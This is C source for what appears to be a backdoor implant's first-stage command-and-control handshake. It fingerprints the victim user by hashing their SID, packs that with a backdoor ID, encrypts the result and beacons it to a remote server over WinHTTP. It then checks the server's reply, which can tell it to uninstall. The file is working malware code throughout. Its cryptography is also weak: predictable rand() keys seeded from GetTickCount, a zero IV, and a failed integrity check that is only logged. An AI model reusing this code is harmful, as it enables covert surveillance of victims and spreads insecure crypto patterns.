#include <Windows.h>
#include <Sddl.h>
#include <winhttp.h>
#include <stdio.h>

#include "binpatched_vars.h"
#include "proto.h"
#include "md5.h"
#include "sha1.h"
#include "aes_alg.h"
#include "base64.h"
#include "win_http.h"

extern HINTERNET hGlobalInternet; // remove me.

VOID ProtoAuthenticate()
{
	PBYTE pRandomData, pProtoMessage, pInstanceId;
	BYTE pConfKey[32];
	BYTE pServerKey[32];
	BYTE pSha1Buffer[32];
	BYTE pInitVector[16];
	SHA1Context pSha1Context;
	aes_context pAesContext;
	static BOOL uFirstTime = TRUE;

	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	
	SecureZeroMemory(pSha1Buffer, sizeof(pSha1Buffer));
	SecureZeroMemory(&pSha1Context, sizeof(pSha1Context));
	SecureZeroMemory(&pAesContext, sizeof(pAesContext));

	pRandomData = (PBYTE)malloc(16);
	GenerateRandomData(pRandomData, 16);

	memcpy(pSha1Buffer, pConfKey, 16);
	memcpy(pSha1Buffer + 16, pRandomData, 16);

	SHA1Reset(&pSha1Context);
	SHA1Input(&pSha1Context, pSha1Buffer, 32);
	SHA1Result(&pSha1Context);
	for(ULONG x=0; x<5; x++)
		pSha1Context.Message_Digest[x] = ntohl(pSha1Context.Message_Digest[x]);

	pInstanceId = (PBYTE)malloc(20);
	GetUserUniqueHash(pInstanceId, 20);

	if (uFirstTime)
	{
		srand(GetTickCount());
		uFirstTime = FALSE;
	}
	ULONG uRandPoolLen = (rand()%(1024-128))+128;

	// proto_v + rand + sha1(conf_key + rand) + bdoor_id(padded) + instance_id + subtype + randpool	
	ULONG uCryptBufferLen = Align(sizeof(ULONG) + 16 + 20 + strlen(BACKDOOR_ID) + 2 + 20 + sizeof(ULONG), 16);
	ULONG uMessageLen = uCryptBufferLen + uRandPoolLen;
	pProtoMessage = (PBYTE)malloc(uMessageLen);
	PBYTE pMessageBuffer = pProtoMessage;

	// proto version
	*(PULONG)pMessageBuffer = 0x1; 
	pMessageBuffer += sizeof(ULONG);

	// kd
	memcpy(pMessageBuffer, pRandomData, 16);
	pMessageBuffer += 16;

	// sha1(conf_key + kd)
	memcpy(pMessageBuffer, pSha1Context.Message_Digest, 20);
	pMessageBuffer += 20;

	// backdoor_id
	memcpy(pMessageBuffer, BACKDOOR_ID, strlen(BACKDOOR_ID));
	pMessageBuffer += strlen(BACKDOOR_ID);
	memcpy(pMessageBuffer, "\x00\x00", 0x2); // 16 byte padding (id is 14byte fixed len)
	pMessageBuffer += 0x2;

	// instance id
	memcpy(pMessageBuffer, pInstanceId, 20);
	pMessageBuffer += 20;

	// subtype
	pMessageBuffer[0] = 0x0; // ARCH: windows
	pMessageBuffer[1] = 0x0; // STAGE: scout
	pMessageBuffer[2] = 0x1; // TYPE: release
	pMessageBuffer[3] = 0x0; // FLAG: reserved

	// encrypt
	memset(pInitVector, 0x0, 16);
	aes_set_key(&pAesContext, (PBYTE)pServerKey, 128);
	aes_cbc_encrypt(&pAesContext, pInitVector, pProtoMessage, pProtoMessage, uCryptBufferLen);
	
	// append random block
	GenerateRandomData(pProtoMessage + uCryptBufferLen, uRandPoolLen);

	//base64 everything
	PBYTE pBase64Message = (PBYTE)base64_encode(pProtoMessage, uMessageLen);

	// send request & get response
	
	ULONG uResponseLen;
	WinHTTPSendData(pBase64Message, strlen((char *)pBase64Message));
	PBYTE pHttpResponseBufferB64 = WinHTTPGetResponse(&uResponseLen); 

	// base64
	ULONG uOut;
	PBYTE pProtoResponse = base64_decode((char *)pHttpResponseBufferB64, uResponseLen, (int *)&uOut);
	free(pHttpResponseBufferB64);

	// decrypt
	memset(pInitVector, 0x0, 16);
	SecureZeroMemory(&pAesContext, sizeof(pAesContext));
	aes_set_key(&pAesContext, (PBYTE)pConfKey, 128);
	aes_cbc_decrypt(&pAesContext, pInitVector, pProtoResponse, pProtoResponse, uOut);


	// response [ serverrand + sha1(sha1(conf_key + serverrand + kd) + serverrand) + response(PROTO_OK|_NO|_UNINSTALL + time64_t)

	// rand
	PBYTE pServerRandomData = (PBYTE)malloc(16);
	memcpy(pServerRandomData, pProtoResponse, 16);

	// first sha1
	PBYTE pTempBuffer = (PBYTE)malloc(16 + 16 + 16);
	memcpy(pTempBuffer, pConfKey, 16);
	memcpy(pTempBuffer + 16, pServerRandomData, 16);
	memcpy(pTempBuffer + 16 + 16, pRandomData, 16);

	SHA1Reset(&pSha1Context);
	SHA1Input(&pSha1Context, pTempBuffer, 16 + 16 + 16);
	SHA1Result(&pSha1Context);
	for(ULONG x=0; x<5; x++)
		pSha1Context.Message_Digest[x] = ntohl(pSha1Context.Message_Digest[x]);

	PBYTE pFirstSha1Digest = (PBYTE)malloc(20);
	memcpy(pFirstSha1Digest, pSha1Context.Message_Digest, 20);

	// second sha1
	pTempBuffer = (PBYTE)realloc(pTempBuffer, 36);
	memcpy(pTempBuffer, pFirstSha1Digest, 20);
	memcpy(pTempBuffer + 20, pServerRandomData, 16);

	SHA1Reset(&pSha1Context);
	SHA1Input(&pSha1Context, pTempBuffer, 36);
	SHA1Result(&pSha1Context);
	for(ULONG x=0; x<5; x++)
		pSha1Context.Message_Digest[x] = ntohl(pSha1Context.Message_Digest[x]);

	// check sha1sum with the one provided by server
	if (memcmp(pSha1Context.Message_Digest, pProtoResponse + 16, 20))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Sha1 does not match !!!\n");
#endif
	}


	//



	// ok verificato da ora in poi la chiave di session sono i primi 16 byte dello sha1(calcolato prima kd + conf_key)


}


BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize)
{
	HANDLE hToken=0;
	PTOKEN_USER pTokenOwner=NULL;
	DWORD dwLen=0;
	LPSTR pStringSid;
	BOOL bRetVal = FALSE;

	if (!pUserHash)
		return FALSE;
	memset(pUserHash, 0, uHashSize);
	if (uHashSize < SHA_DIGEST_LENGTH)
		return FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken)) 
	{
		GetTokenInformation(hToken, TokenUser, pTokenOwner, 0, &dwLen);
		if (dwLen)
			pTokenOwner = (PTOKEN_USER)malloc(dwLen);
		if (pTokenOwner) 
		{
			memset(pTokenOwner, 0, dwLen);
			if (GetTokenInformation(hToken, TokenUser, pTokenOwner, dwLen, &dwLen) &&
				ConvertSidToStringSidA(pTokenOwner->User.Sid, &pStringSid)) 
			{
				SHA1Context sha;
				SHA1Reset(&sha);
				SHA1Input(&sha, (PBYTE)pStringSid, (DWORD)(strlen(pStringSid)));
				if (SHA1Result(&sha)) 
				{
					for (int i=0; i<5; i++)
						sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
					memcpy(pUserHash, sha.Message_Digest, SHA_DIGEST_LENGTH);
					bRetVal = TRUE;
				}
				LocalFree(pStringSid);
			}
			free(pTokenOwner);
		}
		CloseHandle(hToken);
	}
	return bRetVal;
}

VOID GenerateRandomData(PBYTE pBuffer, ULONG uBuffLen)
{
	static BOOL uFirstTime = TRUE;
	ULONG i;

	if (uFirstTime) {
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	for (i=0; i<uBuffLen; i++)
		pBuffer[i] = rand();
}



ULONG Align(ULONG uSize, ULONG uAlignment)
{
	return (((uSize + uAlignment - 1) / uAlignment) * uAlignment);
}
